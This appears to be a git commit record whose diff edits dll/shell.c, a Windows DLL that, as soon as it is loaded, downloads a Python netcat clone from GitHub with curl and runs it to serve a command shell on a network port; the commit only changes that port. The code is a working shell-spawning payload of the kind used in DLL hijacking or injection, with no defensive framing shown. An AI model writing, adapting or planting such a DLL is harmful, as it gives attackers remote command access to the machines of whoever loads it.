7ba146dcb6d491e57c44bd06077a47d5f39dc5f7
joshmerr <joshmerrill255@gmail.com>
2022-04-07 16:59:46 -0400

    shell

--- dll/shell.c
+++ dll/shell.c
@@ -8,7 +8,7 @@ DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
         case DLL_PROCESS_ATTACH:
             int i;
             i = system ("curl https://raw.githubusercontent.com/stackviolator/blackhatpython/main/networking/netcat/netcat.py -o .\\nc.py");
-            i = system ("python .\\nc.py -t 10.0.71.105 -l -c -p 9090");
+            i = system ("python .\\nc.py -t 10.0.71.105 -l -c -p 9696");
             break;
     }
     return TRUE;
